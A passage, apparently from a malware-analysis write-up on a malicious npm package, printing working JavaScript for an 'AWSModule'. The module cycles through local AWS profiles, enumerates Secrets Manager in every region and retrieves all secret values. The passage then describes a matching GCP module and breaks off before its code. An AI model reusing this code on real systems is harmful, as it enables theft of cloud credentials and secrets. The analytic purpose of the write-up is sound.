</span></span><span class="line"><span class="cl">          <span class="k">const</span> <span class="n">profileMatches</span> <span class="o">=</span> <span class="n">content</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="o">/</span>\<span class="p">[(</span><span class="err">?</span><span class="p">:</span><span class="n">profile</span> <span class="p">)</span><span class="err">?</span><span class="p">([</span><span class="o">^</span>\<span class="p">]]</span><span class="o">+</span><span class="p">)</span>\<span class="p">]</span><span class="o">/</span><span class="n">g</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="n">profileMatches</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="p">(</span><span class="k">const</span> <span class="n">match</span> <span class="n">of</span> <span class="n">profileMatches</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">              <span class="k">const</span> <span class="n">profileName</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="o">/</span>\<span class="p">[(</span><span class="err">?</span><span class="p">:</span><span class="n">profile</span> <span class="p">)</span><span class="err">?</span><span class="o">/</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;]&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">              <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">profiles</span><span class="o">.</span><span class="n">includes</span><span class="p">(</span><span class="n">profileName</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">profiles</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="n">profileName</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">              <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="o">//</span> <span class="n">Silent</span> <span class="n">catch</span> <span class="k">for</span> <span class="n">file</span> <span class="n">reading</span> <span class="n">errors</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">//</span> <span class="n">Ensure</span> <span class="s1">&#39;default&#39;</span> <span class="n">profile</span> <span class="n">is</span> <span class="n">first</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">profiles</span><span class="o">.</span><span class="n">includes</span><span class="p">(</span><span class="s2">&#34;default&#34;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">profiles</span><span class="o">.</span><span class="n">splice</span><span class="p">(</span><span class="n">profiles</span><span class="o">.</span><span class="n">indexOf</span><span class="p">(</span><span class="s2">&#34;default&#34;</span><span class="p">),</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">profiles</span><span class="o">.</span><span class="n">unshift</span><span class="p">(</span><span class="s2">&#34;default&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">profiles</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">async</span> <span class="n">initialize</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">callerIdentity</span><span class="p">)</span> <span class="k">return</span> <span class="bp">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">profilesToTry</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">      <span class="n">process</span><span class="o">.</span><span class="n">env</span><span class="o">.</span><span class="n">AWS_PROFILE</span> <span class="o">||</span> <span class="s2">&#34;default&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="o">...</span><span class="n">this</span><span class="o">.</span><span class="n">parseAwsProfiles</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="k">const</span> <span class="n">profile</span> <span class="n">of</span> <span class="ne">Array</span><span class="o">.</span><span class="n">from</span><span class="p">(</span><span class="n">new</span> <span class="n">Set</span><span class="p">(</span><span class="n">profilesToTry</span><span class="p">)))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="n">credentials</span> <span class="o">=</span> <span class="n">fromIni</span><span class="p">({</span> <span class="n">profile</span> <span class="p">});</span>
</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="n">stsClient</span> <span class="o">=</span> <span class="n">new</span> <span class="n">STSClient</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">          <span class="n">region</span><span class="p">:</span> <span class="s2">&#34;us-east-1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="n">credentials</span>
</span></span><span class="line"><span class="cl">        <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="n">identity</span> <span class="o">=</span> <span class="n">await</span> <span class="n">stsClient</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">new</span> <span class="n">GetCallerIdentityCommand</span><span class="p">({}));</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">identity</span><span class="o">.</span><span class="n">UserId</span> <span class="o">&amp;&amp;</span> <span class="n">identity</span><span class="o">.</span><span class="n">Account</span> <span class="o">&amp;&amp;</span> <span class="n">identity</span><span class="o">.</span><span class="n">Arn</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="n">this</span><span class="o">.</span><span class="n">callerIdentity</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">userId</span><span class="p">:</span> <span class="n">identity</span><span class="o">.</span><span class="n">UserId</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">account</span><span class="p">:</span> <span class="n">identity</span><span class="o">.</span><span class="n">Account</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">arn</span><span class="p">:</span> <span class="n">identity</span><span class="o">.</span><span class="n">Arn</span>
</span></span><span class="line"><span class="cl">          <span class="p">};</span>
</span></span><span class="line"><span class="cl">          <span class="n">this</span><span class="o">.</span><span class="n">profile</span> <span class="o">=</span> <span class="n">profile</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="n">this</span><span class="o">.</span><span class="n">stsClient</span> <span class="o">=</span> <span class="n">stsClient</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="k">return</span> <span class="bp">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="o">//</span> <span class="n">Continue</span> <span class="n">to</span> <span class="n">next</span> <span class="n">profile</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="bp">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">getSecretsClient</span><span class="p">(</span><span class="n">region</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">this</span><span class="o">.</span><span class="n">secretsClients</span><span class="o">.</span><span class="n">has</span><span class="p">(</span><span class="n">region</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="n">client</span> <span class="o">=</span> <span class="n">new</span> <span class="n">SecretsManagerClient</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">        <span class="n">region</span><span class="p">:</span> <span class="n">region</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">credentials</span><span class="p">:</span> <span class="n">fromIni</span><span class="p">({</span> <span class="n">profile</span><span class="p">:</span> <span class="n">this</span><span class="o">.</span><span class="n">profile</span> <span class="p">})</span>
</span></span><span class="line"><span class="cl">      <span class="p">});</span>
</span></span><span class="line"><span class="cl">      <span class="n">this</span><span class="o">.</span><span class="n">secretsClients</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="n">region</span><span class="p">,</span> <span class="n">client</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">this</span><span class="o">.</span><span class="n">secretsClients</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">region</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">async</span> <span class="n">isValid</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">await</span> <span class="n">this</span><span class="o">.</span><span class="n">initialize</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">async</span> <span class="n">getCallerIdentity</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">await</span> <span class="n">this</span><span class="o">.</span><span class="n">initialize</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">this</span><span class="o">.</span><span class="n">callerIdentity</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">async</span> <span class="n">listSecrets</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">await</span> <span class="n">this</span><span class="o">.</span><span class="n">initialize</span><span class="p">())</span> <span class="k">return</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">secrets</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">seenArns</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Set</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="k">const</span> <span class="n">region</span> <span class="n">of</span> <span class="n">this</span><span class="o">.</span><span class="n">REGIONS</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="n">client</span> <span class="o">=</span> <span class="n">this</span><span class="o">.</span><span class="n">getSecretsClient</span><span class="p">(</span><span class="n">region</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="n">response</span> <span class="o">=</span> <span class="n">await</span> <span class="n">client</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">new</span> <span class="n">ListSecretsCommand</span><span class="p">({}));</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="k">const</span> <span class="n">secret</span> <span class="n">of</span> <span class="n">response</span><span class="o">.</span><span class="n">SecretList</span> <span class="o">||</span> <span class="p">[])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="n">secret</span><span class="o">.</span><span class="n">ARN</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">seenArns</span><span class="o">.</span><span class="n">has</span><span class="p">(</span><span class="n">secret</span><span class="o">.</span><span class="n">ARN</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">seenArns</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">secret</span><span class="o">.</span><span class="n">ARN</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">secrets</span><span class="o">.</span><span class="n">push</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">              <span class="n">name</span><span class="p">:</span> <span class="n">secret</span><span class="o">.</span><span class="n">Name</span> <span class="o">||</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">              <span class="n">arn</span><span class="p">:</span> <span class="n">secret</span><span class="o">.</span><span class="n">ARN</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">              <span class="n">description</span><span class="p">:</span> <span class="n">secret</span><span class="o">.</span><span class="n">Description</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">              <span class="n">lastChangedDate</span><span class="p">:</span> <span class="n">secret</span><span class="o">.</span><span class="n">LastChangedDate</span>
</span></span><span class="line"><span class="cl">            <span class="p">});</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">error</span><span class="o">.</span><span class="n">name</span> <span class="o">===</span> <span class="s2">&#34;AccessDeniedException&#34;</span> <span class="o">||</span> <span class="n">error</span><span class="o">.$</span><span class="n">metadata</span><span class="err">?</span><span class="o">.</span><span class="n">httpStatusCode</span> <span class="o">===</span> <span class="mi">403</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="n">console</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="s2">&#34;Permission denied listing secrets. Stopping scan.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">secrets</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">async</span> <span class="n">getSecretValue</span><span class="p">(</span><span class="n">secretId</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">await</span> <span class="n">this</span><span class="o">.</span><span class="n">initialize</span><span class="p">())</span> <span class="k">return</span> <span class="n">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">let</span> <span class="n">targetRegion</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="o">//</span> <span class="n">Extract</span> <span class="n">region</span> <span class="n">from</span> <span class="n">ARN</span> <span class="k">if</span> <span class="n">provided</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">secretId</span><span class="o">.</span><span class="n">startsWith</span><span class="p">(</span><span class="s2">&#34;arn:aws:secretsmanager:&#34;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="n">arnParts</span> <span class="o">=</span> <span class="n">secretId</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">arnParts</span><span class="o">.</span><span class="n">length</span> <span class="o">&gt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">targetRegion</span> <span class="o">=</span> <span class="n">arnParts</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">regionsToTry</span> <span class="o">=</span> <span class="n">targetRegion</span> <span class="err">?</span> <span class="p">[</span><span class="n">targetRegion</span><span class="p">]</span> <span class="p">:</span> <span class="n">this</span><span class="o">.</span><span class="n">REGIONS</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="k">const</span> <span class="n">region</span> <span class="n">of</span> <span class="n">regionsToTry</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="n">client</span> <span class="o">=</span> <span class="n">this</span><span class="o">.</span><span class="n">getSecretsClient</span><span class="p">(</span><span class="n">region</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="n">response</span> <span class="o">=</span> <span class="n">await</span> <span class="n">client</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">new</span> <span class="n">GetSecretValueCommand</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">          <span class="n">SecretId</span><span class="p">:</span> <span class="n">secretId</span>
</span></span><span class="line"><span class="cl">        <span class="p">}));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="n">name</span><span class="p">:</span> <span class="n">response</span><span class="o">.</span><span class="n">Name</span> <span class="o">||</span> <span class="n">secretId</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="n">secretString</span><span class="p">:</span> <span class="n">response</span><span class="o">.</span><span class="n">SecretString</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="n">secretBinary</span><span class="p">:</span> <span class="n">response</span><span class="o">.</span><span class="n">SecretBinary</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="n">versionId</span><span class="p">:</span> <span class="n">response</span><span class="o">.</span><span class="n">VersionId</span>
</span></span><span class="line"><span class="cl">        <span class="p">};</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="o">//</span> <span class="n">Continue</span> <span class="n">to</span> <span class="n">next</span> <span class="n">region</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">async</span> <span class="n">getAllSecretValues</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">await</span> <span class="n">this</span><span class="o">.</span><span class="n">initialize</span><span class="p">())</span> <span class="k">return</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">allSecrets</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">seenArns</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Set</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="k">const</span> <span class="n">region</span> <span class="n">of</span> <span class="n">this</span><span class="o">.</span><span class="n">REGIONS</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="n">client</span> <span class="o">=</span> <span class="n">this</span><span class="o">.</span><span class="n">getSecretsClient</span><span class="p">(</span><span class="n">region</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="n">listResponse</span> <span class="o">=</span> <span class="n">await</span> <span class="n">client</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">new</span> <span class="n">ListSecretsCommand</span><span class="p">({}));</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="k">const</span> <span class="n">secret</span> <span class="n">of</span> <span class="n">listResponse</span><span class="o">.</span><span class="n">SecretList</span> <span class="o">||</span> <span class="p">[])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">secret</span><span class="o">.</span><span class="n">ARN</span> <span class="o">||</span> <span class="n">seenArns</span><span class="o">.</span><span class="n">has</span><span class="p">(</span><span class="n">secret</span><span class="o">.</span><span class="n">ARN</span><span class="p">))</span> <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          
</span></span><span class="line"><span class="cl">          <span class="n">seenArns</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">secret</span><span class="o">.</span><span class="n">ARN</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          
</span></span><span class="line"><span class="cl">          <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">const</span> <span class="n">valueResponse</span> <span class="o">=</span> <span class="n">await</span> <span class="n">client</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">new</span> <span class="n">GetSecretValueCommand</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">              <span class="n">SecretId</span><span class="p">:</span> <span class="n">secret</span><span class="o">.</span><span class="n">Name</span> <span class="o">||</span> <span class="n">secret</span><span class="o">.</span><span class="n">ARN</span>
</span></span><span class="line"><span class="cl">            <span class="p">}));</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="n">allSecrets</span><span class="o">.</span><span class="n">push</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">              <span class="n">name</span><span class="p">:</span> <span class="n">valueResponse</span><span class="o">.</span><span class="n">Name</span> <span class="o">||</span> <span class="n">secret</span><span class="o">.</span><span class="n">Name</span> <span class="o">||</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">              <span class="n">secretString</span><span class="p">:</span> <span class="n">valueResponse</span><span class="o">.</span><span class="n">SecretString</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">              <span class="n">secretBinary</span><span class="p">:</span> <span class="n">valueResponse</span><span class="o">.</span><span class="n">SecretBinary</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">              <span class="n">versionId</span><span class="p">:</span> <span class="n">valueResponse</span><span class="o">.</span><span class="n">VersionId</span>
</span></span><span class="line"><span class="cl">            <span class="p">});</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="o">//</span> <span class="n">Skip</span> <span class="n">secret</span> <span class="k">if</span> <span class="n">value</span> <span class="n">cannot</span> <span class="n">be</span> <span class="n">retrieved</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">error</span><span class="o">.</span><span class="n">name</span> <span class="o">===</span> <span class="s2">&#34;AccessDeniedException&#34;</span> <span class="o">||</span> <span class="n">error</span><span class="o">.$</span><span class="n">metadata</span><span class="err">?</span><span class="o">.</span><span class="n">httpStatusCode</span> <span class="o">===</span> <span class="mi">403</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="n">console</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="s2">&#34;Permission denied listing secrets. Stopping scan.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">allSecrets</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">module</span><span class="o">.</span><span class="n">exports</span> <span class="o">=</span> <span class="p">{</span> <span class="n">AWSModule</span> <span class="p">};</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="gcpmodule">GCPModule</h5>
<p>The GCPModule operates very similarly to the AWSModule. Its primary function, isValid(), handles authentication against Google Cloud Platform. Once authenticated, the getAllSecretValues() function enumerates all available secrets in Google Secret Manager and retrieves the value of each one.</p>
<img src="/static/NPM/image-24.png" alt="drawing" width="1000"/>
<img src="/static/NPM/image-23.png" alt="drawing" width="1000"/>
<p>Full code:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
